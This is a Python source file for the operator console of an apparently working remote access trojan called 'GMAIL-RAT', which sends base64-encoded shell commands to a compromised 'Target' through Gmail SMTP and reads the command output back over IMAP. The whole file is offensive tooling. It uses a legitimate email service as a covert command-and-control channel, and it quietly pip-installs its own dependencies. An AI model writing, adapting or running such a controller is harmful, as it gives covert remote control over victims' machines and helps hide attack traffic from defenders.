import base64
import email
import imaplib
import os
import platform
import smtplib
import time
import random
print("[*] Checking Requirements Module.....")
if platform.system().startswith("Linux"):
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style

elif platform.system().startswith("Windows"):
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *

colorama.deinit()
banner = Center.XCenter("""
*********************++++++++++++++++++*******************************
*     ______ __  __    _    ___ _          ____      _  _______       *
+    / / ___|  \/  |  / \  |_ _| |        |  _ \    / \|_   _\ \`     +
*   | | |  _| |\/| | / _ \  | || |   _____| |_) |  / _ \ | |  | |     *
+  < <| |_| | |  | |/ ___ \ | || |__|_____|  _ <  / ___ \| |   > >    +
*   | |\____|_|  |_/_/   \_\___|_____|    |_| \_\/_/   \_\_|  | |     *
+    \_\                                                     /_/      +
*                                                                     *
+                   Coded By: Machine1337                             +
**************************+++++++++++++++++++++************************
                            \n\n
""")
def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
    catc()
smtpserver="smtp.gmail.com"
smtpuser="Your_1st_gmail@gmail.com" 
smtpkey="your_1st_gmail_app_password"
imapserver="imap.gmail.com"
imapboy="your_2nd_gmail@gmail.com"

def catc():
    try:
        send_command()
        read_result()
    except KeyboardInterrupt:
        print(Fore.RED+"\n[*]You Pressed The Exit Button! Now Going For sleep")
        quit()
    else:
        print(Fore.RED+'\nSome Network Shit! Please Re-Run The C2 Server')

def send_command():
 while True:
    command=str(input(termcolor.colored("\n[*] Enter Command [*]:- ",'green')))
    message_bytes = command.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    server=smtplib.SMTP(smtpserver,587)
    server.starttls()
    server.login(smtpuser,smtpkey)
    server.sendmail(smtpuser, imapboy,base64_message)
    server.quit()
    print(Fore.GREEN+"\n[+] Command Sent To The Target")
    time.sleep(1)
    print(termcolor.colored("[*] Waiting For The Result: (sleep 10s For Good Result)",'cyan'))
    time.sleep(10)
    read_result()
def read_result():

    message=imaplib.IMAP4_SSL(imapserver)
    message.login(smtpuser,smtpkey)
    message.select("inbox")
    _, data=message.search(None, "UNSEEN")

    for x in data[0].split():
        _, msg=message.fetch(x, '(RFC822)')
        _, g=msg[0]
        data_email= email.message_from_bytes(g)
        for m in data_email.walk():
            if m.get_content_type() == "text/plain":
                body=m.get_payload(decode=True)
                message=body.decode("utf-8")
                message_bytes = base64.b64decode(message + '=' * (-len(message) % 4))
                final = message_bytes.decode("utf-8",errors="replace")
                print(final)
        time.sleep(1)
logo()
